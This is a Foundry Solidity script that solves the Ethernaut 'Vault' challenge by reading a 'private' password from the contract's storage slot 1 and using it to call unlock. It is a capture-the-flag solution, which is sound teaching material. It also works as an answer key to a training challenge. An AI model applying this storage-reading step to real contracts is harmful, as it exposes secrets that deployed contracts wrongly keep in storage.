// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {stdStorage, StdStorage} from "forge-std/Test.sol";              


contract VaultSolution is Script, EthernautHelper {
    using stdStorage for StdStorage;

    address constant LEVEL_ADDRESS = 0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        
        /**
         * Understanding Solidity’s Storage Layout And How To Access State Variables In Storage Slots.
         *
         * The following function doesn't work for private variable:
         *
         *     (, bytes memory returnData) = challengeInstance.call(abi.encodeWithSignature("password()"));
         *     bytes32 password = abi.decode(returnData, (bytes32));
         *
         */
         
        bytes32 password = vm.load(challengeInstance, bytes32(uint256(1)));
        challengeInstance.call(abi.encodeWithSignature("unlock(bytes32)", password));

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(8));
    }
}
